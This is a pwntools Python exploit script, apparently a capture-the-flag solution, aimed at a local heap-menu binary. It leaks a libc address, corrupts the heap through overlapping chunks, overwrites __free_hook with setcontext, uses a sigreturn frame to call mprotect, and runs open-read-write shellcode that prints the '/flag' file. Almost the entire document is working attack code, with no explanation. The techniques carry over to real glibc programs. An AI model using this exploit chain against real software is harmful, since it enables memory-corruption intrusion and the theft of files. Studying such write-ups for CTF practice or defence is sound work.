#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./pwn')

def add(size, payload):
  p.sendlineafter('>>>', str(1))
  p.sendlineafter('size:', str(size))
  p.sendafter('content:', payload)

def delete(idx):
  p.sendlineafter('>>>', str(2))
  p.sendlineafter('index:', str(idx))

def show(idx):
  p.sendlineafter('>>>', str(3))
  p.sendlineafter('index:', str(idx))

def edit(idx, payload):
  p.sendlineafter('>>>', str(4))
  p.sendlineafter('index:', str(idx))
  p.sendafter('content: ', payload)

def merge(idx1, idx2, dst):
  p.sendlineafter('>>>', str(5))
  p.sendlineafter('src index 1:', str(idx1))
  p.sendlineafter('src index 2:', str(idx2))
  p.sendlineafter('dst index:', str(dst))
 
if __name__ == "__main__":
  for i in range(8):
    add(0x100, 'mech0n\n')
  
  for i in range(7, -1, -1):
    delete(i)

  for i in range(7):
    add(0x100, 'mech0n\n')
  
  add(0xe0, 'mech0n\n')   # 7
  add(0x8, 'a' * 8)       # 8
  show(8)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ebc40 - 0x60
  # success('LIBC: ' + str(hex(libc)))

  delete(0)
  delete(1)
  delete(2)
  delete(3)
  delete(4)
  delete(5)
  delete(6)
  add(0x30, 'a' * 0x30)   # 0
  add(0x28, 'a' * 0x28)   # 1
  add(0x80, 'mech0n\n')   # 2
  add(0x58, 'mech0n\n')   # 3
  add(0x30, 'mech0n\n')   # 4 
  add(0x40, 'mech0n\n')   # 5 in
  add(0x30, 'mech0n\n')   # 6 in
  add(0x100, 'mech0n\n')  # 9

  merge(0, 1, 3)
  delete(4)
  delete(5)

  __malloc_hook = 0x00000000003ebc30
  __free_hook = 0x00000000003ed8e8
  __realloc_hook = 0x00000000003ebc28
  realloc = 0x0000000000098c30
  setcontext = 0x0000000000052070
  mprotect = 0x000000000011bae0
  stack = (libc + __free_hook) & 0xfffffffffffff000 

  frame = SigreturnFrame()
  frame.rdi = stack
  frame.rsi = 0x1000
  frame.rdx = 7
  frame.rsp = libc + __free_hook + 0x10
  frame.rip = libc + mprotect
  payload = str(frame)
  edit(9, payload)

  shellcode1 = '''
  xor rdi, rdi
  mov rsi, %d
  mov rdx, 0x1000
  mov rax, 0
  syscall
  jmp rsi
  ''' % (stack)

  payload = 'a' * 0x38 + p64(0x41) + p64(libc + __free_hook)
  add(0x80, payload)      # 4
  add(0x40, 'mech0n\n')   # 5
  payload = p64(libc + setcontext + 53) + p64(libc + __free_hook + 0x18) * 2 + asm(shellcode1)
  add(0x40, payload) # 
  delete(9)

  shellcode2 = '''
    xor rdi, rdi
    mov rdi, 0x67616c662f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall

    mov rdi, 0
    mov rax, 60
    syscall
  '''
  p.sendline(asm(shellcode2))

  # gdb.attach(p)
  p.interactive()